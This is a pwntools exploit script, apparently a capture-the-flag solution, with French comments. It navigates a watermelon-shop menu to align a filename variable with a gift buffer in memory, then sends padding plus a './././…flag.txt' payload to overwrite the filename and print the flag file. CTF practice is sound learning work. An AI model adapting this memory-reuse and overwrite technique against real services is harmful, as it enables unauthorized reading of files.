from pwn import *

p = remote("instances.challenge-ecw.fr", 42554)

p.recv()
p.sendline(b"1") # On choisit d'acheter une pastèque 

p.recv()
p.sendline(b"1") # On choisit la pastèque

p.recv()
p.sendline(b"y") # On choisit de faire cadeau

p.recv()
p.sendline(b"1") # On choisit une enveloppe de 16 bytes

p.recv()
p.sendline(b"a") # On envoie un nom de destinataire au hasard

p.recv()
p.sendline(b"a"*16) # On envoie un message de 16 bytes

p.recv()
p.sendline(b"2") # On met la variable contenant le nom du fichier dans le même emplacement en mémoire que le cadeaux

p.recv()
p.sendline(b"1") # On choisit d'acheter une pastèque 

p.recv()
p.sendline(b"1") # On choisit la pastèque

p.recv()
p.sendline(b"y") # On choisit de faire cadeau

p.recv()
p.sendline(b"3") # On choisit une enveloppe de 64 bytes

p.recv()
pay = b"a"*49 + b"././././././././././././flag.txt"
p.sendline(pay) # On envoie le payload
log.info(f"payload = {pay}")

p.recv()

p.sendline(b"2") # On affiche le flag
p.sendline(b"3") # On quitte le programme
log.success(p.recvall()) # Puis on affiche l'output avec notre flag